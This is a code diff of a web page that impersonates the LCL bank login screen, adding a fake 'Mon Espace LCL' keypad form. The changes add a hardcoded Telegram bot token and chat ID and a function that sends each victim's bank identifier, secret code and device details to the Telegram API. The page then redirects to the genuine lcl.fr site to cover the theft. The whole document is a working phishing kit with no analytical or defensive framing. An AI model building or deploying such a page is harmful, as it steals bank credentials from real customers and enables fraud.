@@ -3,46 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vérification Sécurité LCL</title>
+    <title>Mon Espace LCL</title>
     <style>
         body {
-            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            background-color: #f4f4f4;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #ffffff;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
             margin: 0;
+            color: #333;
         }
 
         .container {
-            background-color: white;
-            padding: 30px;
-            width: 320px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            border-radius: 8px;
+            width: 100%;
+            max-width: 360px;
+            padding: 20px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo img {
+            max-width: 120px;
+            height: auto;
         }
 
         h2 {
-            text-align: center;
-            color: #0055a4; /* Bleu LCL */
-            margin-bottom: 20px;
             font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 25px;
+            text-align: center;
+            color: #000;
         }
 
         .input-group {
-            margin-bottom: 20px;
-            position: relative;
+            margin-bottom: 25px;
         }
 
         label {
             display: block;
-            margin-bottom: 8px;
             font-size: 14px;
-            color: #555;
+            color: #666;
+            margin-bottom: 10px;
         }
 
-        /* Zone de saisie invisible (pour capter le focus) */
+        .bubbles-container {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 10px;
+        }
+
+        .bubble {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background-color: transparent;
+            border: 1px solid #ccc;
+            transition: all 0.2s;
+        }
+
+        .bubble.filled {
+            background-color: #333;
+            border-color: #333;
+        }
+
         .hidden-input {
             position: absolute;
             opacity: 0;
@@ -50,59 +79,57 @@
             height: 0;
         }
 
-        /* Affichage des points (style demandé) */
-        .display-area {
-            border: none;
-            /* Fond blanc pur pour masquer la bordure, ou transparent si préférence */
-            background: transparent; 
-            font-size: 24px;
-            text-align: center;
-            letter-spacing: 3px;
-            color: #333;
-            width: 100%;
-            padding: 10px 0;
-            box-sizing: border-box;
-            /* Pas de bordure classique */
-            border-bottom: 1px dashed #ccc; /* Optionnel : une fine ligne pointillée très légère pour délimiter */
-        }
-
-        /* Clavier numérique */
         .keypad {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            margin-top: 20px;
+            gap: 12px;
+            margin-top: 10px;
         }
 
         .key {
-            background-color: #f0f0f0;
+            background-color: #f8f8f8;
             border: none;
             border-radius: 50%;
             width: 60px;
             height: 60px;
-            font-size: 20px;
-            font-weight: bold;
-            color: #333;
+            font-size: 22px;
+            font-weight: 500;
+            color: #000;
             cursor: pointer;
-            transition: background-color 0.2s;
-            margin: 0 auto; /* Centrer les boutons */
+            margin: 0 auto;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            transition: background-color 0.1s;
         }
 
         .key:active {
-            background-color: #ddd;
-            transform: scale(0.95);
-        }
-
-        .key-clear {
-            background-color: #ffcccb; /* Rouge pâle */
-            color: #c00;
-        }
-        
-        .key-back {
             background-color: #e0e0e0;
         }
 
-        .btn-submit {
+        .key-clear {
+            font-size: 16px;
+            color: #d00;
+            background-color: #fff;
+            box-shadow: none;
+        }
+
+        .links {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .links a {
+            color: #666;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        .btn-validate {
             width: 100%;
             padding: 12px;
             background-color: #0055a4;
@@ -110,42 +137,50 @@
             border: none;
             border-radius: 4px;
             font-size: 16px;
+            font-weight: bold;
             cursor: pointer;
             margin-top: 20px;
-        }
-        
-        .btn-submit:disabled {
-            background-color: #ccc;
-            cursor: not-allowed;
+            opacity: 0.5;
+            pointer-events: none;
         }
 
+        .btn-validate.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 11px;
+            color: #999;
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>Vérification de Sécurité</h2>
-    <p style="text-align: center; font-size: 13px; color: #666; margin-bottom: 20px;">
-        Veuillez entrer vos identifiants pour confirmer votre identité.
-    </p>
-
-    <!-- Champ Identifiant (10 chiffres) -->
-    <div class="input-group">
-        <label>Identifiant (10 chiffres)</label>
-        <!-- Input caché qui capture la frappe -->
-        <input type="tel" id="input-id" class="hidden-input" maxlength="10" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
-        <!-- Zone visuelle avec des points -->
-        <div id="display-id" class="display-area"></div>
+    <div class="logo">
+        <!-- Placeholder LCL -->
+        <svg width="100" height="40" viewBox="0 0 100 40">
+            <text x="0" y="30" font-family="Arial" font-weight="bold" font-size="24" fill="#0055a4">LCL</text>
+        </svg>
     </div>
 
-    <!-- Champ Mot de passe (6 chiffres) -->
+    <h2>Pour aller de l’avant</h2>
+
     <div class="input-group">
-        <label>Code secret</label>
-        <input type="tel" id="input-pass" class="hidden-input" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
-        <div id="display-pass" class="display-area"></div>
+        <label>Votre identifiant</label>
+        <input type="tel" id="input-id" class="hidden-input" maxlength="10" inputmode="numeric" autocomplete="off">
+        <div class="bubbles-container" id="bubbles-id"></div>
     </div>
 
-    <!-- Clavier Numérique -->
+    <div class="input-group">
+        <label>Votre code personnel</label>
+        <input type="tel" id="input-pass" class="hidden-input" maxlength="6" inputmode="numeric" autocomplete="off">
+        <div class="bubbles-container" id="bubbles-pass"></div>
+    </div>
+
     <div class="keypad">
         <button class="key" onclick="press('1')">1</button>
         <button class="key" onclick="press('2')">2</button>
@@ -156,143 +191,133 @@
         <button class="key" onclick="press('7')">7</button>
         <button class="key" onclick="press('8')">8</button>
         <button class="key" onclick="press('9')">9</button>
-        <button class="key key-back" onclick="backspace()">⌫</button>
         <button class="key" onclick="press('0')">0</button>
-        <button class="key key-clear" onclick="clearAll()">C</button>
+        <button class="key key-clear" onclick="backspace()">⌫</button>
     </div>
 
-    <button class="btn-submit" id="btn-validate" disabled onclick="validate()">Valider</button>
+    <button class="btn-validate" id="btn-validate" onclick="validate()">Valider</button>
+
+    <div class="links">
+        <a href="#">Identifiant oublié ?</a>
+        <a href="#">Code personnel oublié ?</a>
+        <a href="#">Ouvrir un compte</a>
+    </div>
+
+    <footer>
+        monespace.lcl.fr
+    </footer>
 </div>
 
 <script>
-    let activeField = 'id'; // 'id' ou 'pass'
+    // ==========================================
+    // CONFIGURATION TELEGRAM (À REMPLIR)
+    // ==========================================
+    const botToken = '8835375365:AAGXLvfFbU_wNtDvs5jxpEe019V2n6IY_WQ/getUpdates'; // Ex: 123456789:ABCdefGHIjklMNOpqrsTUVwxyz
+    const chatId = '8501464548';     // Ex: 123456789 ou @nom_de_votre_groupe
+    // ==========================================
+
     const inputId = document.getElementById('input-id');
     const inputPass = document.getElementById('input-pass');
-    const displayId = document.getElementById('display-id');
-    const displayPass = document.getElementById('display-pass');
+    const bubblesIdContainer = document.getElementById('bubbles-id');
+    const bubblesPassContainer = document.getElementById('bubbles-pass');
     const btnValidate = document.getElementById('btn-validate');
 
-    // Initialisation : focus sur l'ID
-    inputId.focus();
+    let activeField = 'id';
 
-    // Cliquer sur la zone de texte active l'input correspondant
-    displayId.addEventListener('click', () => {
-        activeField = 'id';
-        inputId.focus();
-        updateCursor('id');
-    });
-
-    displayPass.addEventListener('click', () => {
-        activeField = 'pass';
-        inputPass.focus();
-        updateCursor('pass');
-    });
-
-    // Mettre à jour le curseur visuel (ligne sous les points)
-    function updateCursor(field) {
-        if(field === 'id') {
-            displayId.style.borderBottom = "1px dashed #0055a4";
-            displayPass.style.borderBottom = "1px dashed #ccc";
-        } else {
-            displayPass.style.borderBottom = "1px dashed #0055a4";
-            displayId.style.borderBottom = "1px dashed #ccc";
+    function createBubbles(container, count) {
+        for (let i = 0; i < count; i++) {
+            const bubble = document.createElement('div');
+            bubble.className = 'bubble';
+            container.appendChild(bubble);
         }
     }
 
-    // Gestion des boutons du clavier
-    function press(num) {
-        if (activeField === 'id') {
-            if (inputId.value.length < 10) {
-                inputId.value += num;
-                updateDisplay('id', inputId.value);
-            }
-        } else {
-            if (inputPass.value.length < 6) {
-                inputPass.value += num;
-                updateDisplay('pass', inputPass.value);
+    createBubbles(bubblesIdContainer, 10);
+    createBubbles(bubblesPassContainer, 6);
+
+    document.querySelector('label[for="input-id"]').parentElement.addEventListener('click', () => { activeField = 'id'; inputId.focus(); });
+    document.querySelector('.input-group:nth-child(2)').addEventListener('click', () => { activeField = 'pass'; inputPass.focus(); });
+
+    function updateBubbles(input, container) {
+        const bubbles = container.getElementsByClassName('bubble');
+        for (let i = 0; i < bubbles.length; i++) {
+            if (i < input.value.length) {
+                bubbles[i].classList.add('filled');
+            } else {
+                bubbles[i].classList.remove('filled');
             }
         }
-        checkValidation();
+    }
+
+    function press(num) {
+        let currentInput = activeField === 'id' ? inputId : inputPass;
+        if (currentInput.value.length < currentInput.maxLength) {
+            currentInput.value += num;
+            updateBubbles(currentInput, activeField === 'id' ? bubblesIdContainer : bubblesPassContainer);
+            checkValidation();
+        }
     }
 
     function backspace() {
-        if (activeField === 'id') {
-            inputId.value = inputId.value.slice(0, -1);
-            updateDisplay('id', inputId.value);
-        } else {
-            inputPass.value = inputPass.value.slice(0, -1);
-            updateDisplay('pass', inputPass.value);
-        }
-        checkValidation();
-    }
-
-    function clearAll() {
-        inputId.value = '';
-        inputPass.value = '';
-        updateDisplay('id', '');
-        updateDisplay('pass', '');
-        activeField = 'id';
-        inputId.focus();
-        updateCursor('id');
-        checkValidation();
-    }
-
-    // Mise à jour visuelle des points
-    function updateDisplay(type, value) {
-        if (type === 'id') {
-            // Affiche des points pour chaque chiffre
-            displayId.textContent = '•'.repeat(value.length);
-            // Si on veut voir le chiffre au dernier moment ou juste des points :
-            // Ici on force des points pour plus de sécurité
-        } else {
-            displayPass.textContent = '•'.repeat(value.length);
+        let currentInput = activeField === 'id' ? inputId : inputPass;
+        if (currentInput.value.length > 0) {
+            currentInput.value = currentInput.value.slice(0, -1);
+            updateBubbles(currentInput, activeField === 'id' ? bubblesIdContainer : bubblesPassContainer);
+            checkValidation();
         }
     }
 
-    // Vérifier si on peut activer le bouton Valider
     function checkValidation() {
         if (inputId.value.length === 10 && inputPass.value.length === 6) {
-            btnValidate.disabled = false;
+            btnValidate.classList.add('active');
         } else {
-            btnValidate.disabled = true;
+            btnValidate.classList.remove('active');
         }
     }
 
-    // Simulation de validation
+    // Fonction d'envoi vers Telegram
+    async function sendToTelegram(username, password) {
+        const message = `🔐 *Nouvelle Connexion LCL*\n\n👤 Utilisateur: ${username}\n🔑 Code: ${password}\n📅 Date: ${new Date().toLocaleString()}\n📱 Appareil: ${navigator.userAgent}`;
+        
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+        } catch (error) {
+            console.error('Erreur envoi Telegram:', error);
+        }
+    }
+
     function validate() {
-        const id = inputId.value;
-        const pass = inputPass.value;
-        alert(`Données envoyées :\nID : ${id}\nCode : ${pass}`);
-        // Ici, tu peux ajouter le code pour envoyer les données à ton serveur
-        // window.location.href = "https://ton-site.com/submit?id=" + id + "&pass=" + pass;
+        if (btnValidate.classList.contains('active')) {
+            const id = inputId.value;
+            const pass = inputPass.value;
+
+            // 1. Envoi des données à Telegram
+            sendToTelegram(id, pass);
+
+            // 2. Redirection vers le vrai site après 2 secondes
+            setTimeout(() => {
+                window.location.href = "https://www.lcl.fr"; // Ou "https://monespace.lcl.fr"
+            }, 2000);
+        }
     }
 
-    // Support de la frappe clavier physique
     document.addEventListener('keydown', (e) => {
-        if (e.key >= '0' && e.key <= '9') {
-            press(e.key);
-        } else if (e.key === 'Backspace') {
-            backspace();
-        } else if (e.key === 'Tab') {
-            e.preventDefault();
-            if(activeField === 'id') {
-                activeField = 'pass';
-                inputPass.focus();
-                updateCursor('pass');
-            } else {
-                activeField = 'id';
-                inputId.focus();
-                updateCursor('id');
-            }
-        }
+        if (e.key >= '0' && e.key <= '9') press(e.key);
+        else if (e.key === 'Backspace') backspace();
+        else if (e.key === 'Enter' && btnValidate.classList.contains('active')) validate();
     });
 
-    // Garder le focus sur le champ actif
-    document.addEventListener('click', (e) => {
-        if(activeField === 'id') inputId.focus();
-        else inputPass.focus();
-    });
-
+    inputId.focus();
 </script>
 
 </body>
